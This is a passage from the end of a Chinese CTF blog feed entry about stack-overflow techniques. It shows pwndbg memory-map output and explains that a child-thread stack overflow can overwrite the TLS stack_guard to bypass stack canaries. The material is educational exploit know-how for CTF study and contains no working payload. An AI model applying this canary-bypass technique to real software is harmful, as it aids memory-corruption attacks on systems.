0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x (void*)(pthread_self())</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">16 = 0x7ffff7fa8680</span></span><br></pre></td></tr></table></figure><p>如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。</p><p>但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程<code>fs</code> 寄存器地址的，所以可以通过此来实现覆盖。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;杂谈&quot;&gt;杂谈&lt;/h3&gt;
&lt;p&gt;作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。&lt;/p&gt;
&lt;p&gt;本文一定程度上参考了</summary>
      
    
    
    
    <category term="CTF" scheme="http://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://v3rdant.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="http://v3rdant.cn/tags/CTF/"/>
    
  </entry>
  
</feed>
